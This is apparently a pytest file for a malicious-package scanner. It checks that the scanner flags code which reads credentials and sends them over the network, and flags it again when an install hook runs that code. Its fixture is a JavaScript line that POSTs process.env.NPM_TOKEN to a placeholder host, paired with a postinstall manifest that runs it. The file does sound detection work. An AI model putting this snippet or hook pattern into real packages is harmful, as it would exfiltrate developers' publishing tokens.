"""Behaviour features: the scanner's own capability labels, counted per package and per coupled pair."""

from __future__ import annotations

from cordon_scanner.model.behaviour import BEHAVIOUR_DENSE, COUPLED, BehaviourFeatures
from cordon_scanner.model.features import PACKAGE_BASE, PACKAGE_DENSE, PackageFeatures

SENDS_TOKEN = b"const t = process.env.NPM_TOKEN;\nfetch('https://example.invalid/c', { method: 'POST', body: t });\n"
PLAIN = b"module.exports = (a, b) => a + b;\n"


class BehaviourKit:
    @staticmethod
    def named(values: list[float]) -> dict[str, float]:
        return dict(zip(BEHAVIOUR_DENSE, values, strict=True))


class TestBehaviourFeatures:
    def test_the_layout_follows_the_base_features(self) -> None:
        assert (*PACKAGE_BASE, *BEHAVIOUR_DENSE) == PACKAGE_DENSE
        assert len(set(BEHAVIOUR_DENSE)) == len(BEHAVIOUR_DENSE)

    def test_plain_code_carries_no_behaviour(self) -> None:
        assert not any(BehaviourFeatures.of([("index.js", PLAIN)], set()))

    def test_a_credential_sent_is_the_coupled_pair(self) -> None:
        named = BehaviourKit.named(BehaviourFeatures.of([("lib/send.js", SENDS_TOKEN)], set()))
        assert named["beh_credential_files"] > 0 and named["beh_egress_files"] > 0
        assert named["beh_credential_egress_files"] > 0
        assert named["beh_credential_egress_hook"] == 0

    def test_in_a_file_an_install_hook_runs_it_is_marked_so(self) -> None:
        named = BehaviourKit.named(
            BehaviourFeatures.of([("lib/send.js", SENDS_TOKEN)], {"lib/send.js"})
        )
        assert named["beh_credential_egress_hook"] == 1 and named["beh_egress_hook"] == 1

    def test_the_package_vector_carries_it_from_the_manifest(self) -> None:
        files = [
            (
                "package/package.json",
                b'{"name": "x", "scripts": {"postinstall": "node lib/send.js"}}',
            ),
            ("package/lib/send.js", SENDS_TOKEN),
        ]
        dense, _ = PackageFeatures.extract(files)
        named = dict(zip(PACKAGE_DENSE, dense, strict=True))
        assert named["beh_credential_egress_hook"] == 1

    def test_every_pair_names_two_known_capabilities(self) -> None:
        from cordon_scanner.core.models import Capability

        known = {c.value for c in Capability}
        assert all(a in known and b in known for a, b in COUPLED)
